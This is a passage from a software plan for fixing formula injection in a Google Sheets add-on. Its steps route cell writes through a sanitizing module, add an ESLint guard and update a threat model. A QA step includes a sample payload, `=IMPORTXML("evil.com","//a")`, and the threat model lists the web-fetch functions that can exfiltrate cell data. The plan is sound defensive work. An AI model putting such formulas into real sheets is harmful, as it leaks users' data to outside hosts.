          .getRange(realRowIndex, groundingIdx + 1)
          .setRichTextValue(toCellValue(parseMarkdown(groundingMarkdown)));
      }
    }
```

to:

```ts
    if (config.includeGrounding && groundingIdx >= 0) {
      const groundingMarkdown = groundingToMarkdown(result, resolvedUris);
      if (groundingMarkdown !== null) {
        writeSafeRichText(
          sheet.getRange(realRowIndex, groundingIdx + 1),
          toCellValue(parseMarkdown(groundingMarkdown)),
        );
      }
    }
```

- [ ] **Step 4: Replace the `directWrites` loop**

Change:

```ts
  for (const [i, errorText] of directWrites) {
    sheet.getRange(startRow + i, outputIdx + 1).setValue(errorText);
  }
```

to:

```ts
  for (const [i, errorText] of directWrites) {
    writeSafeValue(sheet.getRange(startRow + i, outputIdx + 1), errorText);
  }
```

- [ ] **Step 5: Run typecheck, lint, and the full suite**

Run: `npm run typecheck && npm run lint && npm test`
Expected: All pass.

- [ ] **Step 6: Commit**

```bash
git add src/server/index.ts
git commit -m "fix(security): route all runBatchAI writes through safe-writes (AI-56, AI-76)"
```

---

### Task 4: Migrate `formatMarkdownSelection`

**Files:**
- Modify: `src/server/index.ts:291` (call site), `index.ts` import block (add `writeSafeRichTextGrid`)

**Interfaces:**
- Consumes: `writeSafeRichTextGrid(range, grid: RichTextValue[][]): void` from Task 1.

- [ ] **Step 1: Add `writeSafeRichTextGrid` to the `./safe-writes` import**

```ts
import {
  findOrCreateColumn,
  writeColumn,
  writeSafeValue,
  writeSafeRichText,
  writeSafeRichTextGrid,
} from "./safe-writes";
```

- [ ] **Step 2: Replace the raw grid write**

Change:

```ts
  range.setRichTextValues(grid);
  ui.alert(`Formatted ${count} cell(s).`);
```

to:

```ts
  writeSafeRichTextGrid(range, grid);
  ui.alert(`Formatted ${count} cell(s).`);
```

- [ ] **Step 3: Run typecheck, lint, and the full suite**

Run: `npm run typecheck && npm run lint && npm test`
Expected: All pass.

- [ ] **Step 4: Commit**

```bash
git add src/server/index.ts
git commit -m "fix(security): route formatMarkdownSelection's grid write through safe-writes"
```

---

### Task 5: Migrate `sampleRowsToEvaluation`

**Files:**
- Modify: `src/server/index.ts:220-230` (call sites), `index.ts` import block (add `writeSafeValueGrid`)

**Interfaces:**
- Consumes: `writeSafeValueGrid(range, values: unknown[][]): void` from Task 1.

- [ ] **Step 1: Add `writeSafeValueGrid` to the `./safe-writes` import**

```ts
import {
  findOrCreateColumn,
  writeColumn,
  writeSafeValue,
  writeSafeValueGrid,
  writeSafeRichText,
  writeSafeRichTextGrid,
} from "./safe-writes";
```

- [ ] **Step 2: Replace the header-row copy and the sampled-row copy**

Change:

```ts
  if (!targetSheet) {
    targetSheet = ss.insertSheet(targetName);
    const headers = sourceSheet.getRange(1, 1, 1, sourceSheet.getLastColumn()).getValues();
    targetSheet.getRange(1, 1, 1, headers[0].length).setValues(headers);
  }

  const selectedRows = sampleRows(allData, sampleSize, seed);

  // Write to target
  const targetRow = targetSheet.getLastRow() + 1;
  targetSheet
    .getRange(targetRow, 1, selectedRows.length, selectedRows[0].length)
    .setValues(selectedRows);
```

to:

```ts
  if (!targetSheet) {
    targetSheet = ss.insertSheet(targetName);
    const headers = sourceSheet.getRange(1, 1, 1, sourceSheet.getLastColumn()).getValues();
    writeSafeValueGrid(targetSheet.getRange(1, 1, 1, headers[0].length), headers);
  }

  const selectedRows = sampleRows(allData, sampleSize, seed);

  // Write to target
  const targetRow = targetSheet.getLastRow() + 1;
  writeSafeValueGrid(
    targetSheet.getRange(targetRow, 1, selectedRows.length, selectedRows[0].length),
    selectedRows,
  );
```

- [ ] **Step 3: Run typecheck, lint, and the full suite**

Run: `npm run typecheck && npm run lint && npm test`
Expected: All pass.

- [ ] **Step 4: Commit**

```bash
git add src/server/index.ts
git commit -m "fix(security): route sampleRowsToEvaluation's copy through safe-writes"
```

---

### Task 5b: Fix newly-discovered gap — runBatchAI's column-header creation

**Found during Task 6:** attempting to add the ESLint enforcement rule immediately failed `npm run lint` against pre-existing code — two raw `.setValue()` calls in `runBatchAI` that create the output/grounding column headers were missed by the original design's call-site audit and by Tasks 2–5's briefs. `config.outputCol` is a value the user types into the sidebar's "Output column" field (RPC-supplied, never passing through Sheets' own cell-entry escaping) — the same category already established for `prepRecipe`'s `colTitle`, which is why `findOrCreateColumn` already sanitizes its title writes. This code hand-rolls the identical find-or-append-column pattern instead of calling it.

**Files:**
- Modify: `src/server/index.ts:352-372`

**Interfaces:**
- Consumes: `findOrCreateColumn(sheet, title: string): number` (already relocated to `./safe-writes` and already imported in `index.ts` from Task 1).

- [ ] **Step 1: Replace the hand-rolled output/grounding column creation with `findOrCreateColumn`**

Change:

```ts
  // Resolve output column — create if not found
  let outputIdx = headers.indexOf(config.outputCol);
  if (outputIdx === -1) {
    const newColIdx = sheet.getLastColumn() + 1;
    sheet.getRange(1, newColIdx).setValue(config.outputCol);
    outputIdx = newColIdx - 1;
    headers.push(config.outputCol); // keep in sync, matching grounding column pattern
  }

  // Resolve grounding column — create if not found (only when opted in)
  let groundingIdx = -1;
  const groundingColName = config.outputCol + "_grounding";
  if (config.includeGrounding) {
    groundingIdx = headers.indexOf(groundingColName);
    if (groundingIdx === -1) {
      const newColIdx = sheet.getLastColumn() + 1;
      sheet.getRange(1, newColIdx).setValue(groundingColName);
      groundingIdx = newColIdx - 1;
      headers.push(groundingColName); // keep in sync for subsequent rows
    }
  }
```

to:

```ts
  // Resolve output column — create if not found
  const outputIdx = findOrCreateColumn(sheet, config.outputCol) - 1;

  // Resolve grounding column — create if not found (only when opted in)
  let groundingIdx = -1;
  const groundingColName = config.outputCol + "_grounding";
  if (config.includeGrounding) {
    groundingIdx = findOrCreateColumn(sheet, groundingColName) - 1;
  }
```

`findOrCreateColumn` re-fetches headers directly from the sheet and returns a 1-based index whether the column already existed or was just created — subtract 1 to preserve the existing 0-based `outputIdx`/`groundingIdx` used throughout the rest of the function. The `headers.push(...)` lines are dropped: `headers` (the in-memory array from `getSheetHeaders()`, line ~312) is never read again anywhere later in `runBatchAI` — it was only being kept in sync for these two now-removed lookups.

- [ ] **Step 2: Run typecheck, lint, and the full suite**

Run: `npm run typecheck && npm run lint && npm test`
Expected: All pass. (Do NOT yet add the ESLint enforcement rule from Task 6 in this task — that's the next task, once this gap is closed lint will pass cleanly under it.)

- [ ] **Step 3: Commit**

```bash
git add src/server/index.ts
git commit -m "fix(security): route runBatchAI's column-header creation through findOrCreateColumn"
```

---

### Task 6: Add the ESLint enforcement rule

**Files:**
- Modify: `eslint.config.mjs`

**Interfaces:**
- Consumes: nothing (this is a static check, not runtime code).

- [ ] **Step 1: Add a scoped `no-restricted-syntax` rule forbidding raw Sheets write calls outside `safe-writes.ts`**

In `eslint.config.mjs`, add a new config object to the array passed to `defineConfig`, after the existing one:

```js
export default defineConfig([globalIgnores(["**/dist/", "**/node_modules/", "**/*.js"]), {
    extends: compat.extends("eslint:recommended", "plugin:@typescript-eslint/recommended"),

    plugins: {
        "@typescript-eslint": typescriptEslint,
    },

    languageOptions: {
        globals: {
            ...globals.node,
        },

        parser: tsParser,
    },

    rules: {
        "@typescript-eslint/no-unused-vars": ["error", {
            argsIgnorePattern: "^_",
            caughtErrorsIgnorePattern: "^_",
        }],

        "@typescript-eslint/explicit-function-return-type": "warn",
        "@typescript-eslint/no-explicit-any": "warn",
    },
}, {
    files: ["src/server/**/*.ts"],
    ignores: ["src/server/safe-writes.ts"],
    rules: {
        "no-restricted-syntax": ["error", {
            selector:
                "CallExpression[callee.type='MemberExpression'][callee.property.name=/^(setValue|setValues|setRichTextValue|setRichTextValues)$/]",
            message:
                "Raw Sheets write calls are restricted to src/server/safe-writes.ts. Route this write through writeSafeValue/writeSafeValueGrid/writeSafeRichText/writeSafeRichTextGrid. See docs/threat_models/ssi-toolkit-threat-model.md, T6.",
        }],
    },
}]);
```

- [ ] **Step 2: Run lint to confirm it passes now that all call sites are migrated**

Run: `npm run lint`
Expected: PASS — Tasks 2–5 already migrated every call site, so nothing should trip the new rule.

- [ ] **Step 3: Verify the rule actually catches a violation**

Temporarily add throwaway lines anywhere in `src/server/index.ts` (outside `safe-writes.ts`), e.g. right after the imports — `declare const` creates an ambient, lint-only stand-in that never actually runs:

```ts
declare const _tmpCheck: GoogleAppsScript.Spreadsheet.Range;
_tmpCheck.setValue("test");
```

Run: `npm run lint`
Expected: FAIL, reporting the `no-restricted-syntax` message from Step 1 at the line you just added.

Then delete those two temporary lines completely — do not commit them.

- [ ] **Step 4: Run lint once more to confirm the repo is clean again**

Run: `npm run lint`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add eslint.config.mjs
git commit -m "chore(security): enforce safe-writes as the only path for Sheets cell writes"
```

---

### Task 7: Update the threat model document

**Files:**
- Modify: `docs/threat_models/ssi-toolkit-threat-model.md`

**Interfaces:**
- Consumes: nothing (documentation only).

- [ ] **Step 1: Rewrite T6's row in the "What Can Go Wrong?" table**

Replace the current T6 row (in the `## 2. What Can Go Wrong?` table) with:

```markdown
| T6 | Formula injection via untrusted-origin cell writes | A4, C5 | Six Apps Script functions write content to spreadsheet cells that the acting user did not directly and knowingly type into that specific cell: `runBatchAI` (AI-generated text, plain/markdown/grounding), `extractText` (Drive document/OCR text), `formatMarkdownSelection` (re-parses and rewrites a selection's existing cell content), `sampleRowsToEvaluation` (bulk-copies existing cell content, including previously-written AI/Extract-Text output, into a new `_evaluation` sheet), and `writeColumn`/`findOrCreateColumn` (the shared write primitives used by `importDriveLinks` and `prepRecipe`, including form-field values a collaborator typed into a recipe input rather than a cell). Because Sheets evaluates any string beginning with `=`, `+`, or `-` as a formula regardless of which API wrote it, and none of these six functions' contract genuinely requires producing a *live* formula (Apps Script provides `setFormula()`/`setFormulas()` as the distinct, explicit API for that intent, unused by any of the six), a value assembled by our own code can become an auto-executing formula the moment it's written — most dangerously via Sheets' web-fetch functions (IMAGE, IMPORTDATA, IMPORTXML, IMPORTHTML, IMPORTRANGE, IMPORTFEED), which can encode adjacent cell values into an outbound HTTP request. This is the general vulnerability class underlying the point-fixes previously tracked as R8 (AI-56), R21 (AI-75), and R22 (AI-76) — all three are superseded by R45's structural fix (see below). Considered: the Gemini grounding-markdown write (`groundingToMarkdown`) always wraps variable/attacker-influenceable content (citation titles, URLs) behind a fixed literal prefix (`"Sources (...)"`, `"Search queries: ..."`), so its assembled string's first character can never be a formula-trigger character regardless of grounding-source content — not itself a live gap, but routed through the same safe-write primitive anyway per R45's blanket policy. Out of scope (accepted residual risk, see R45): a human user manually copy-pasting (Ctrl+C/Ctrl+V, paste-special-values, drag-fill) an already-neutralized cell's content into a new cell in the Sheets UI — no Apps Script code or trigger runs before/during a native clipboard paste, so this cannot be intercepted by anything in this add-on's control; consistent with the existing note that user-authored formulas are outside this add-on's threat model. |
```

- [ ] **Step 2: Add response R45 to the "What Are We Going to Do About It?" table**

Add a new row immediately after the existing R44 row:

```markdown
| T6 | R45 | Reduce | Implement a centralized "safe write" module (`src/server/safe-writes.ts`) as the only sanctioned path for writing a value to a spreadsheet cell: `writeSafeValue`/`writeSafeValueGrid` (plain text, single cell / grid) and `writeSafeRichText`/`writeSafeRichTextGrid` (rich text, single cell / grid), all routing through `sanitizeForCell()` — web-fetch formulas anywhere in the formula body are rejected with an explicit error string; any other formula-triggering prefix is literal-ized with a leading `'` (a correctness guarantee that untrusted content displays as written rather than being silently reinterpreted by Sheets, with a defense-in-depth bonus against any web-fetch-capable function not yet in the blocklist). Rich-text writes sanitize the already-rendered flattened text (`RichTextValue.getText()`), not the pre-markdown-parsed source, since markdown syntax can obscure a formula-triggering leading character or break the web-fetch pattern's adjacency match; formatting is dropped only on the (expected-rare) cells where sanitization actually had to act. ESLint-enforced (`no-restricted-syntax` in `eslint.config.mjs`): lint fails if a raw `setValue`/`setValues`/`setRichTextValue`/`setRichTextValues` call appears anywhere in `src/server/**/*.ts` outside `safe-writes.ts`, so a future write site cannot silently bypass the guard. Applied unconditionally to every write, including ones (grounding markdown, `importDriveLinks`' Drive URLs, `prepRecipe`'s journalist-typed form fields) that are not currently provably reachable by untrusted content — reachability is not a stable, locally-verifiable property (a future caller could silently invalidate it), and the guard costs nothing since no current or foreseen feature intends to write a live formula. Supersedes R8, R21, R22. |
```

- [ ] **Step 3: Mark R8, R21, and R22 as superseded**

Edit the existing R8, R21, and R22 rows (in the same table) to append `" Superseded by R45 — see AI-89."` to the end of each row's Description cell, matching the existing R18 → R44 precedent already in the document (`"Superseded by R44 — see AI-88"`).

- [ ] **Step 4: Consolidate the Open Items table**

In the `### Open Items` table (under `## 4. Did We Do a Good Enough Job?`), delete the three existing rows for AI-56 ("Fix T6 — formula injection"), AI-75 ("Fix T6 gap — Extract Text"), and AI-76 ("Fix T6 gap — markdown output"). Add one row in their place:

```markdown
| High | Open | [AI-89](https://linear.app/propublica/issue/AI-89/systemic-fix-for-t6-formula-injection-via-untrusted-cell-writes) | — | Systemic fix for T6 | Centralized safe-write module (`src/server/safe-writes.ts`) covering `runBatchAI` (plain, markdown, grounding), `extractText`, `formatMarkdownSelection`, `sampleRowsToEvaluation`, `writeColumn`/`findOrCreateColumn` — ESLint-enforced (R45); supersedes AI-56/R8, AI-75/R21, AI-76/R22 (all three now children of AI-89 in Linear) |
```

- [ ] **Step 5: Update the document's version/date header**

In the table at the top of the file, bump `Version` (e.g. `1.1` → `1.2`) and update `Last updated` to the date you make this change.

- [ ] **Step 6: Commit**

```bash
git add docs/threat_models/ssi-toolkit-threat-model.md
git commit -m "docs(security): redefine T6 as a vulnerability class, add R45 (AI-89)"
```

---

### Task 8: Full verification and manual QA

**Files:** none (verification only)

**Interfaces:** none.

- [ ] **Step 1: Run the full verification suite**

Run: `npm run lint && npm run typecheck && npm run format:check && npm run test:coverage`
Expected: All four pass.

- [ ] **Step 2: Build the project**

Run: `npm run build`
Expected: Completes with no errors; `dist/index.js` and `dist/Sidebar.html` are produced.

- [ ] **Step 3: Deploy to the dev Apps Script project**

Run: `npm run deploy`
Expected: Completes with no errors (requires `.clasp.json` to be present — see CLAUDE.md's Git Worktrees section if working from a worktree).

- [ ] **Step 4: Manually verify each migrated tool against the dev sheet**

Open the dev spreadsheet (`npm run clasp:open` for the script editor, or open the sheet directly) and check:
1. **Extract Text**: point it at a Drive document whose content is literally `=SUM(1,2)` as plain text (type this into the source Doc, not as a live formula). Confirm the output cell displays `=SUM(1,2)` as literal text, not `3`.
2. **Run AI with markdown formatting on**: run a prompt that asks the model to respond with exactly `=SUM(1,2)` as its entire answer (e.g. system prompt: "Respond with exactly the text: =SUM(1,2)"). Confirm the output cell displays the literal text, not a computed value, and note whether formatting was dropped as expected.
3. **Format Markdown Selection**: manually type `=IMPORTXML("evil.com","//a")` into a cell with a leading apostrophe (so it's literal text, not a live formula), select it, run "Format Markdown Selection" from the macro/menu, and confirm the cell still displays the literal text afterward (not rejected into an error, since this path isn't AI-controlled — but confirm it doesn't turn live).
4. **Sample Rows**: on a sheet with an AI-output column containing sanitized content (from step 2), run "Sample Rows" to copy a sample into an `_evaluation` sheet, and confirm the copied cell still displays as literal text in the new sheet — not a live, recomputed formula.

- [ ] **Step 5: Report results**

If any manual check in Step 4 shows content being evaluated as a live formula instead of displaying literally, stop and treat it as a bug in the corresponding Task (2–5) before proceeding further (e.g. open a PR).
